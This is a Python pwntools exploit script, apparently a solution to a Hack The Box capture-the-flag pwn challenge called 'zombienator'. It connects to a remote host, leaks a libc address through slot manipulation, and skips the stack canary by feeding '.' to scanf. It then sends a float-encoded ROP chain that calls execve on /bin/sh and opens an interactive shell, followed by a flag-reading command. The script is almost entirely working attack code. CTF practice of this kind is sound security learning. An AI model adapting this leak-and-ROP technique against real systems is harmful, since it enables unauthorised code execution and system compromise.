#!/usr/bin/env python3
from pwn import *


def float_pack(num):
    return str(struct.unpack('d', p64(num))[0]).encode()


elf = ELF('/home/kali/Desktop/htb/pwn/pwn_zombienator/challenge/zombienator')
rop = ROP(elf)
libc = ELF('/home/kali/Desktop/htb/pwn/pwn_zombienator/challenge/glibc/libc.so.6')
rop_libc = ROP(libc)
context.arch = elf.arch

# p = process('/home/kali/Desktop/htb/pwn/pwn_zombienator/challenge/zombienator', env={"LD_PRELOAD":"/home/kali/Desktop/htb/pwn/pwn_zombienator/challenge/glibc/libc.so.6"})
# gdb.attach(p, gdbscript='b *attack+240\nc')
p = remote('94.237.58.77', 34849)

# LEAK LIBC ADDRESS
for i in range(10):
    print(p.recv().decode(errors='ignore'))
    p.sendline(b'1')
    print(p.recv().decode(errors='ignore'))
    p.sendline(b'130')
    print(p.recv().decode(errors='ignore'))
    p.sendline(str(i).encode())

for i in range(10):
    print(p.recv().decode(errors='ignore'))
    p.sendline(b'2')
    print(p.recv().decode(errors='ignore'))
    p.sendline(str(i).encode())


print(p.recv().decode(errors='ignore'))
p.sendline(b'3')

resp = p.recv()
addr = u64(resp[resp.find(b'Slot [7]: ')+10:resp.find(b'\nSlot [8]')].ljust(8, b'\x00'))
print(f"LEAKED ADDRESS -> {hex(addr)}")
libc_addr = addr - 2202848
print(f"LIBC ADDRESS -> {hex(libc_addr)}")

# BUFFER OVERFLOW
p.sendline(b'4')

print(p.recv().decode(errors='ignore'))
p.sendline(str(35 + 9))

for i in range(35):
    print(p.recv().decode(errors='ignore'))
    p.sendline(b'.') # . skips scanf and bypass canary overwrite

# rop chain to call /bin/sh
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(rop_libc.find_gadget(['pop rdi', 'ret']).address + libc_addr))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(next(libc.search(b'/bin/sh')) + libc_addr))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(rop_libc.find_gadget(['pop rsi', 'ret']).address + libc_addr))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(0))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(rop_libc.find_gadget(['pop rdx', 'ret']).address + libc_addr))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(0))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(rop_libc.find_gadget(['pop rax', 'ret']).address + libc_addr))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(0x3b))
print(p.recv().decode(errors='ignore'))
p.sendline(float_pack(rop_libc.find_gadget(['syscall', 'ret']).address + libc_addr))

p.interactive()


# cat flag.txt>&0   # redirect output to stdin (because stdout and stderr is closed)
